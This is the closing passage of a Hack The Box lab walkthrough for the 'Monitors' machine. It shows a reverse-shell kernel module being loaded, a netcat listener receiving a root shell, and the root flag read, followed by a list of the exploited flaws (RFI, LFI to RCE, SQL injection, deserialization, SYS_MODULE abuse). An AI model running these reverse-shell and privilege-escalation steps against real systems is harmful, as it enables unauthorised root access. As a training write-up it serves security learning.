+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@531ea6f91c39:/root<span class="comment"># insmod reverse-shell.ko</span></span><br><span class="line">insmod reverse-shell.ko</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s check our netcat listner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">marcus@monitors:~$ nc -lnvp 4443</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4443)</span><br><span class="line"></span><br><span class="line">Connection from 10.10.10.238 41538 received!</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@monitors:/<span class="comment"># </span></span><br><span class="line">root@monitors:/<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@monitors:/<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@monitors:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">a58bf869665a6b00d8d31d195d2af59b</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1943.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion</li>
+<li>use &#x2F;proc&#x2F;self&#x2F;fd from LFI to RCE</li>
+<li>SQL Injection vulnerability due to input validation failure when editing colors (CVE-2020-14295)</li>
+<li>Apache OFBiz XML-RPC Java Deserialization</li>
+<li>privesc via Abusing SYS_MODULE capability</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/05/01/monitors/" title="Hack-The-Box-walkthrough[Monitors]">https://fdlucifer.github.io/2021/05/01/monitors/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/23/Atom/" rel="prev" title="Hack-The-Box-walkthrough[Atom]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Atom]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/03/love/" rel="next" title="Hack-The-Box-walkthrough[Love]">
+                  Hack-The-Box-walkthrough[Love] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
